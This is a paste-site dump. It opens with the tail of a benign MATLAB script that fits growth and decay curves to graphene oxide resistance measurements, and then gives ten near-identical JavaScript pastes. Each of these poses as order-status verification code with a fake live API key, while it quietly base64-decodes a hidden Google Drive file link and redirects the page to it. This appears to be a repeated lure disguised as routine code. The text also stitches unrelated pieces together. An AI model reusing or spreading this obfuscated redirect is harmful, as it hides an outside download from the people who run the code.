    %   fits{k}.fitParams
    %   fits{k}.fitModel   = 'A + B ln(t+1)' or 'C + D exp(-k t)'
    %   fits{k}.timeFit, fits{k}.RFit   (for plotting)
    fits = cell(length(intervals),1);

    %% 4. Fit each interval
    figure('Name','Graphene Growth/Decay Fits','NumberTitle','off');
    hold on; grid on;
    bluef = [0 0 1 0.1];
    plot(t, R,'color',bluef, 'DisplayName','Raw data');  % raw data in background

    for kInt = 1:length(intervals)
        sIdx = intervals{kInt}.startIndex;
        eIdx = intervals{kInt}.endIndex;

        % Extract the subset of data for this interval
        subset_t = t(sIdx:eIdx);
        subset_R = R(sIdx:eIdx);

        % We'll shift time so the start of the interval is t=0
        t0 = subset_t(1);
        shifted_t = subset_t - t0;  % so it goes from 0 up to (end - start)

        % We'll do a finer grid for plotting the fit
        fine_t = linspace(0, shifted_t(end), 200);

        if intervals{kInt}.isOn
            % ""Growth"" interval => fit a log function
            % R(t) = A + B*ln( (t - t0) + 1 ), but since shifted_t = t - t0, 
            % effectively: R(t) = A + B * ln( shifted_t + 1 )

            % Use MATLAB's 'fit' with a custom fittype
            growthModel = fittype(@(A,B,x) A + B*log(x + 1), ...
                                  'independent','x','coefficients',{'A','B'});
            % Initial guesses
            A0 = subset_R(1);
            % Avoid dividing by zero if the interval is very short
            if shifted_t(end) == 0
                B0 = 0; 
            else
                B0 = (subset_R(end) - subset_R(1)) / log(shifted_t(end) + 1 + eps);
            end

            fitGrowth = fit(shifted_t, subset_R, growthModel, 'StartPoint',[A0, B0]);

            % Evaluate the fit for plotting
            Rfit = fitGrowth.A + fitGrowth.B * log(fine_t + 1);

            % Store in fits cell
            fits{kInt}.type       = 'growth';
            fits{kInt}.startIndex = sIdx;
            fits{kInt}.endIndex   = eIdx;
            fits{kInt}.fitModel   = 'R(t) = A + B ln(t+1)';
            fits{kInt}.fitParams  = [fitGrowth.A, fitGrowth.B];
            fits{kInt}.timeFit    = t0 + fine_t;   % shift back to original time scale
            fits{kInt}.RFit       = Rfit;

            % Plot the fit
            plot(fits{kInt}.timeFit, fits{kInt}.RFit, '-', 'LineWidth',1.5, ...
                 'DisplayName', sprintf('Log fit (interval %d)', kInt));

        else
            % ""Decay"" interval => fit an exponential function
            % R(t) = C + D * exp(-k * (t - t0))
            % with shifted_t = t - t0, that becomes: R(t) = C + D * exp(-k * shifted_t)

            decayModel = fittype(@(C,D,k,x) C + D.*exp(-k.*x), ...
                                 'independent','x','coefficients',{'C','D','k'});
            % Initial guesses
            C0 = subset_R(end);             % final (plateau) value
            D0 = subset_R(1) - subset_R(end);
            k0 = 0.01;  % guess a small positive rate

            fitDecay = fit(shifted_t, subset_R, decayModel, 'StartPoint',[C0, D0, k0]);

            % Evaluate the fit for plotting
            Rfit = fitDecay.C + fitDecay.D * exp(-fitDecay.k * fine_t);

            % Store in fits cell
            fits{kInt}.type       = 'decay';
            fits{kInt}.startIndex = sIdx;
            fits{kInt}.endIndex   = eIdx;
            fits{kInt}.fitModel   = 'R(t) = C + D exp(-k t)';
            fits{kInt}.fitParams  = [fitDecay.C, fitDecay.D, fitDecay.k];
            fits{kInt}.timeFit    = t0 + fine_t; 
            fits{kInt}.RFit       = Rfit;

            % Plot the fit
            plot(fits{kInt}.timeFit, fits{kInt}.RFit, '-', 'LineWidth',1.5, ...
                 'DisplayName', sprintf('Exp fit (interval %d)', kInt));
        end
    end

    xlabel('Time (s)');
    ylabel('Resistance (k\Omega)');
    legend('Location','best');
    title('Graphene Oxide Resistance Growth/Decay Fits');
    hold off;

    %% 5. Display final results in the Command Window
    fprintf('\n======= Fit Results by Interval =======\n');
    for kInt = 1:length(intervals)
        switch fits{kInt}.type
            case 'growth'
                A_(kInt) = fits{kInt}.fitParams(1);
                B_(kInt) = fits{kInt}.fitParams(2);
                fprintf('Interval %d (Growth): A = %.4g, B = %.4g\n', kInt, A_(kInt), B_(kInt));
            case 'decay'
                C_(kInt) = fits{kInt}.fitParams(1);
                D_(kInt) = fits{kInt}.fitParams(2);
                k_(kInt) = fits{kInt}.fitParams(3);
                fprintf('Interval %d (Decay): C = %.4g, D = %.4g, k = %.4g\n', kInt, C_(kInt), D_(kInt), k_(kInt));
        end
    end
ftype()
    %% calculating stuff for lab report
    
for i = 1:length(fits)
    R0(i) = fits{i}.RFit(1);
    Rend(i) = fits{i}.RFit(end);
    delta(i) = Rend(i) - R0(i);
    R90(i) = R0(i) + delta(i).*0.9;
    if mod(i,2) == 1
        index(i) = find(fits{i}.RFit > R90(i), 1);
    else
        index(i) = find(fits{i}.RFit < R90(i), 1);
    end
    T0(i) = fits{i}.timeFit(1);
    T90(i) = fits{i}.timeFit(index(i))-T0(i);
    
    S(i) = abs(delta(i))./min([R0(i) Rend(i)]).*100;
end

T90
S

%%
function ftype()
set(gca,'FontSize',13,'fontWeight','bold')
set(findall(gcf,'type','text'),'FontSize',13,'fontWeight','bold')
end"
V3EupsLx,Untitled,RandomCCG,JavaScript,Saturday 22nd of March 2025 05:07:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/848/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
q13FU1pm,Untitled,RandomCCG,JavaScript,Saturday 22nd of March 2025 05:02:05 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/942/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
E0kRvx5m,Untitled,RandomCCG,JavaScript,Saturday 22nd of March 2025 04:56:42 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/737/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rWeNsaDG,Untitled,RandomCCG,JavaScript,Saturday 22nd of March 2025 04:51:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/741/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hjYX5trZ,Untitled,RandomCCG,JavaScript,Saturday 22nd of March 2025 04:45:58 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/750/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
cEAkccFh,Untitled,RandomCCG,JavaScript,Saturday 22nd of March 2025 04:40:24 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/251/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
cfgEYyan,Untitled,RandomCCG,JavaScript,Saturday 22nd of March 2025 04:35:02 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/938/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8BDYTJ6X,Untitled,RandomCCG,JavaScript,Saturday 22nd of March 2025 04:29:39 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/301/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
HU0T5PUw,Untitled,RandomCCG,JavaScript,Saturday 22nd of March 2025 04:23:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/919/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
S0ektR2b,Untitled,RandomCCG,JavaScript,Saturday 22nd of March 2025 04:18:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/558/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
